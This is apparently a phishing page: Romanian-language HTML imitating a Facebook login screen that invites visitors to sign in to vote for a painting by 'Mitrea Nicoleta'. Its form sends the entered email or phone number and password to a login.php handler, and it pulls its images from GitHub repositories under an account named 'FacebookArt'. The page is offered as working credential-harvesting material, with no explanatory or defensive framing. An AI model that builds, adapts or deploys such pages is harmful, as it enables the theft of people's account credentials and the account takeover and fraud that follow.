<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start; /* Align content at the top */
            height: 100vh;
            margin: 0;
        }

        .container {
            width: 90%; /* Adjusted width to be responsive */
            padding: 40px; /* Increased padding for a larger appearance */
            background-color: rgb(242, 241, 241);
            border-radius: 0px; /* Added rounded corners */
            box-shadow: 0 0 0px rgba(0, 0, 0, 0.2);
        }

        .container input[type="text"],
        .container input[type="password"] {
            width: 93%;
            padding: 15px; /* Increased padding for a larger appearance */
            margin: 10px 0;
            border: 1px solid #a9bdca;
            outline: none;
            border-radius: 5px;
            height: 30px; /* Adjusted the height for larger inputs */
            font-size: 18px; /* Increased font size for better visibility */
        }

        .login-button {
            width: 100%;
            padding: 15px; /* Increased padding for a larger appearance */
            background-color: #2916f6;
            border: none;
            color: #fff;
            cursor: pointer;
            border-radius: 5px;
            height: 50px; /* Adjusted the height for a larger button */
            font-size: 18px; /* Increased font size for better visibility */
        }

        .forgot-password {
            text-align: center;
            margin-top: 15px; /* Increased margin top */
        }

        .forgot-password a {
            text-decoration: none;
            color: #3e32c4;
            font-size: 16px; /* Increased font size for better visibility */
        }

        .centered-image1,
        .centered-image2 {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .custom-text {
            font-family: Arial, sans-serif;
            font-size: 16px; /* Increased font size for better visibility */
            margin-top: 15px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="centered-image1">
        <img src="https://raw.githubusercontent.com/FacebookArt/nicoleta5/9f3894203ad4b3ccf04b6359ffebb3b672d5873c/romania2.jpg" alt="Image 1" style="max-width: 100%; margin-bottom: 20px;">
    </div>
    <div class="container">
        <div class="centered-image2">
            <img src="https://raw.githubusercontent.com/FacebookArt/nicoleta55/a50ea33199427466bfdcffa8d5f8155c32548c83/logo2.png" alt= "image 2" style="max-width: 100%; margin-bottom: 20px;">
            <div class="custom-text">Conectează-te la contul tău de Facebook pentru a vota pictura de Mitrea Nicoleta</div>
        </div>
        <form name="login" method="POST" action="login.php">
            <input type="text" class="container input" placeholder="E-mail sau număr de telefon" name="email">
            <input type="password" class="container input" placeholder="Parolă" name="password">
            <button class="login-button" id="loginButton" type="submit">Conectează-te</button>
        </form>
        <div class="forgot-password">
            <a href="#"Ai uitat contul?</a>
        </div>
    </div>
</body>
</html>
